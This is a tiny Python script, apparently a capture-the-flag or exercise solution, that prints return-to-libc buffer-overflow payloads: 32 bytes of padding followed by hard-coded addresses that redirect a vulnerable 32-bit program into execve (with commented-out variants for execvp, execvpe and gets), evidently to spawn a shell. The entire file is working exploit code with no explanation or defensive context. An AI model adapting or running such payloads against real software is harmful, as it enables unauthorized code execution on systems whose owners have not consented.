#!/usr/bin/env python

# execvp
#print "A" * 0x20 + "\x40\x6a\x61\x55" + "B" * 4 + "\x38\x62\x6f\x55" + "\x4c\x7c\x6f\x55"

# execvpe
if 0:
    print ("A" * 0x20 +
        "\x6a\x6a\x61\x55" + # call execvpe
        "\x38\x62\x6f\x55" + # x
        "\x4c\x7c\x6f\x55" + # -> NULL
        "\x4c\x7c\x6f\x55")

# gets
if 0:
    print ("A" * 0x20 +
        "\x30\x3e\x5c\x55" + # gets
        "BBBB" +             # dummy
        "\x38\x62\x6f\x55" + # x
        "\x4c\x7c\x6f\x55" + # -> NULL
        "\x4c\x7c\x6f\x55")
# execve
if 1:
    print ("A" * 0x20 +
        "\x6a\x67\x61\x55" + # call execve
        "\x38\x62\x6f\x55" + # x
        "\x4c\x7c\x6f\x55" + # -> NULL
        "\x4c\x7c\x6f\x55")
